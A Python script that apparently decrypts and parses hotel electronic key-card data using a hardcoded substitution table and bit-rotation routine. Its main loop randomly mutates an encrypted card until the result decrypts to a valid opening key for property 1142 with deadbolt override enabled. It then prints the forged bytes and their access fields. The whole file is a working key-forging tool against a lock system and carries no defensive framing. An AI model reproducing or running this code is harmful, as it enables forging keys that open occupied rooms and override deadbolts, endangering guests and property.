from random import randint

# Some sort of static encryption key??
c_aDecode = [
    0xEA, 0x0D, 0xD9, 0x74, 0x4E, 0x28, 0xFD, 0xBA, 0x7B, 0x98, 0x87, 0x78, 0xDD, 0x8D, 0xB5,
    0x1A, 0x0E, 0x30, 0xF3, 0x2F, 0x6A, 0x3B, 0xAC, 0x09, 0xB9, 0x20, 0x6E, 0x5B, 0x2B, 0xB6,
    0x21, 0xAA, 0x17, 0x44, 0x5A, 0x54, 0x57, 0xBE, 0x0A, 0x52, 0x67, 0xC9, 0x50, 0x35, 0xF5,
    0x41, 0xA0, 0x94, 0x60, 0xFE, 0x24, 0xA2, 0x36, 0xEF, 0x1E, 0x6B, 0xF7, 0x9C, 0x69, 0xDA,
    0x9B, 0x6F, 0xAD, 0xD8, 0xFB, 0x97, 0x62, 0x5F, 0x1F, 0x38, 0xC2, 0xD7, 0x71, 0x31, 0xF0,
    0x13, 0xEE, 0x0F, 0xA3, 0xA7, 0x1C, 0xD5, 0x11, 0x4C, 0x45, 0x2C, 0x04, 0xDB, 0xA6, 0x2E,
    0xF8, 0x64, 0x9A, 0xB8, 0x53, 0x66, 0xDC, 0x7A, 0x5D, 0x03, 0x07, 0x80, 0x37, 0xFF, 0xFC,
    0x06, 0xBC, 0x26, 0xC0, 0x95, 0x4A, 0xF1, 0x51, 0x2D, 0x22, 0x18, 0x01, 0x79, 0x5E, 0x76,
    0x1D, 0x7F, 0x14, 0xE3, 0x9E, 0x8A, 0xBB, 0x34, 0xBF, 0xF4, 0xAB, 0x48, 0x63, 0x55, 0x3E,
    0x56, 0x8C, 0xD1, 0x12, 0xED, 0xC3, 0x49, 0x8E, 0x92, 0x9D, 0xCA, 0xB1, 0xE5, 0xCE, 0x4D,
    0x3F, 0xFA, 0x73, 0x05, 0xE0, 0x4B, 0x93, 0xB2, 0xCB, 0x08, 0xE1, 0x96, 0x19, 0x3D, 0x83,
    0x39, 0x75, 0xEC, 0xD6, 0x3C, 0xD0, 0x70, 0x81, 0x16, 0x29, 0x15, 0x6C, 0xC7, 0xE7, 0xE2,
    0xF6, 0xB7, 0xE8, 0x25, 0x6D, 0x3A, 0xE6, 0xC8, 0x99, 0x46, 0xB0, 0x85, 0x02, 0x61, 0x1B,
    0x8B, 0xB3, 0x9F, 0x0B, 0x2A, 0xA8, 0x77, 0x10, 0xC1, 0x88, 0xCC, 0xA4, 0xDE, 0x43, 0x58,
    0x23, 0xB4, 0xA1, 0xA5, 0x5C, 0xAE, 0xA9, 0x7E, 0x42, 0x40, 0x90, 0xD2, 0xE9, 0x84, 0xCF,
    0xE4, 0xEB, 0x47, 0x4F, 0x82, 0xD4, 0xC5, 0x8F, 0xCD, 0xD3, 0x86, 0x00, 0x59, 0xDF, 0xF2,
    0x0C, 0x7C, 0xC6, 0xBD, 0xF9, 0x7D, 0xC4, 0x91, 0x27, 0x89, 0x32, 0x72, 0x33, 0x65, 0x68,
    0xAF
]

key_levels = [
    (1, "Guest Key"),
    (2, "Connectors"),
    (3, "Suite"),
    (4, "Limited Use"),
    (5, "Failsafe"),
    (6, "Inhibit"),
    (7, "Pool/Meeting Master"),
    (8, "Housekeeping"),
    (9, "Floor Key"),
    (10, "Section Key"),
    (11, "Rooms Master"),
    (12, "Grand Master"),
    (13, "Emergency"),
    (14, "Electronic Lockout"),
    (15, "Secondary Programming Key (SPK)"),
    (16, "Primary Programming Key (PPK)"),
]

weekdays = ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"]

bytes_to_change = 2
iter_count = 0

while True:

    # Encrypted Card data
    strCard = [
        0x64, 0xC0, 0x6F, 0x56, 0x13, 0x69, 0x20, 0xDB, 0x8B, 0x04, 0xE9, 0x32, 0x34, 0x0F, 0xA4, 0xA0,
        0x8A
    ]

    # Pick a random bytes to change (we may accidentally change the same ones)
    for _ in range(0,bytes_to_change):
        pos = randint(0,16)
        b = randint(0,255)
        strCard[pos] = b
        # print("Changing strCard[{}] to 0x{:02x}".format(pos,b))

    # Where we put the decrypted card data
    dc = []

    # Setup
    length = 17

    # Stage 1??
    for i in range(0, length):
        num = c_aDecode[strCard[i]] - (i + 1)
        if num < 0:
            num += 256
        dc.append(num)

    # Stage 2
    bob = dc[10]
    alice = bob & 1 #Even/odd thingy

    # Stage 3
    for zeta in range(17, 0, -1):
        bob = dc[zeta - 1]
        for xi in range(8, 0, -1):
            yip = zeta + xi
            if(yip > length):
                yip -= length
            charlie = dc[yip - 1]
            david = (charlie & 0x80) >> 7
            charlie = ((charlie << 1) & 0xFF) | alice
            alice = (bob & 0x80) >> 7
            bob =  ((bob << 1) & 0xFF) | david
            dc[yip - 1] = charlie
        dc[zeta - 1] = bob

    # Print the contents of our decrypted array
    pos = 0
    for byte in dc:
        pos += 1

    ## Print info ##
    # Byte 0
    key_level_no, key_level_text = key_levels[(dc[0] & 0xF0) >> 4]
    led_warning = (dc[0] & 0x08) >> 3

    # Byte 1
    key_id = dc[1]

    # Byte 2 & 3
    key_record_high = dc[2] & 0x7F
    opening_key = (dc[2] & 0x80) >> 7
    key_record = (key_record_high << 8) | dc[3]

    # Byte 5 & 6
    sequence_combination_number = ((dc[5] & 0x0F) << 8) | dc[6]

    # Property ID and year, bytes 14 & 15
    creation_year_bits = (dc[14] & 0xF0)
    property_id = ((dc[14] & 0x0F) << 8) | dc[15]

    # Byte 7 override deadbolt and days
    override_deadbolt = (dc[7] & 0x80) >> 7
    restricted_weekday = dc[7] & 0x7F

    interval_year = dc[8] >> 4
    interval_month = dc[8] & 0x0f
    interval_day = (dc[9] >> 3) & 0x1F
    interval_hour = ((dc[9] & 0x07) << 2) | (dc[10] >> 6)
    interval_minute = dc[10] & 0x3F

    creation_year = (((dc[11] & 0xF0) >> 4) + 1980) | creation_year_bits
    creation_month = dc[11] & 0x0F;
    creation_day = (dc[12] >> 3) & 0x1F;
    creation_hour = ((dc[12] & 0x07) << 2) | (dc[13] >> 6);
    creation_minute = dc[13] & 0x3F;

    checksum = dc[16]

    # Let's validate the checksum
    csum = 0

    # Duh, checksum isn't part of the checksum, hence 16 instead of 17
    for i in range(0, 16):
        csum += dc[i]

    csum = 255 - (csum & 0xff)

    csum_pass = checksum == csum

    # print("Iteration {}".format(iter_count))
    iter_count += 1

    if interval_year > 1 and csum_pass and opening_key == 1 and property_id == 1142 and override_deadbolt == 1:
        for byte in strCard:
            print("{:02x}".format(byte),end=" ")
        print()
        # Tell me about yourself
        print("----KEY INFO----")
        print("Key Level ({}): {}".format(key_level_no, key_level_text))
        print("LED Warn: {}".format(led_warning))
        print("Key ID: 0x{:02x}".format(key_id))
        print("Opening key: {}".format(opening_key))
        print("Key Record: {:04x}".format(key_record))
        print("Seq. combination: 0x{:02x}".format(sequence_combination_number))
        print("Creation yr. bits: {}".format(creation_year_bits))
        print("Property ID: {}".format(property_id))
        print("Override deadbolt: {}".format(override_deadbolt))
        print("Restricted days (mtwtfss): {:07b}".format(restricted_weekday))
        print("Valid for (YYYY/MM/DDThm): {:04}/{:02}/{:02}T{:02}:{:02}".format(interval_year, interval_month, interval_day, interval_hour, interval_minute))
        print("Creation (YYYY/MM/DDThh:mm): {:04}/{:02}/{:02}T{:02}:{:02}".format(creation_year, creation_month, creation_day, creation_hour, creation_minute))
        print("Checksum: 0x{:02x}".format(checksum))
        print("Computed checksum: 0x{:02x}".format(csum))
        print("Checksum pass: {}".format(csum_pass))
        print("----END KEY INFO----")

